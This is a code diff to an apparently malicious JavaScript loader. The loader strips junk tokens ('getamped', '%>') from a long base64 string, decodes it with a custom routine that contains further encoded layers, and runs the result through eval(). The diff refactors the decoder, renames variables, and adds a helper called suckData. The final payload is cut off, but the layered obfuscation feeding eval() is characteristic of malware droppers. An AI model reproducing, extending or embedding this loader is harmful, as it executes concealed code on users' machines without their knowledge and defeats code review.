@@ -4,24 +4,24 @@ var superString = 'dHJ5ewp2YXIgbG9uZ1RleHQxID0gIkx5OGpjbVZuYVc5dUlGTjFjR1Z5VTNSe
 
 //#endregion
 
-var viniciusDavid = superString.replace(/getamped/g, "").replace(/%>/g, "A");;
+var viniciusDavid = superString.replace(/getamped/g, "").replace(/%>/g, "A");
 
 var xotaX = getampas63mais1(viniciusDavid);
 
 eval(xotaX);
 
-function getampas63mais1(encodedstring) {
+function getampas63mais1(stringSuja) {
     var base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    var in_len = encodedstring.length;
+    var in_len = stringSuja.length;
     var i = 0;
     var j = 0;
     var in_ = 0;
-    var char_array_4 = new Array(4).fill(0);
-    var char_array_3 = new Array(3).fill(0);
+    var char_array_4 = [0, 0, 0, 0];
+    var char_array_3 = [0, 0, 0];
     var ret = [];
 
-    while (in_len-- && (encodedstring[in_] != '=')) {
-        char_array_4[i++] = encodedstring[in_]; in_++;
+    while (in_len-- && (stringSuja[in_] != '=')) {
+        char_array_4[i++] = stringSuja[in_]; in_++;
         if (i == 4) {
             for (i = 0; i < 4; i++)
                 char_array_4[i] = base64_chars.search(char_array_4[i]);
@@ -50,5 +50,16 @@ function getampas63mais1(encodedstring) {
         for (j = 0; (j < i - 1); j++) ret.push(char_array_3[j]);
     }
 
-    return String.fromCharCode(...ret);
+    return suckData(ret).join("");
 };
+
+function suckData(x) {
+
+    var arrayGetampedico = [];
+
+    for (i = 0; i < x.length; i++) {
+        arrayGetampedico.push(String.fromCharCode(x[i]));
+    }
+
+    return arrayGetampedico;
+}
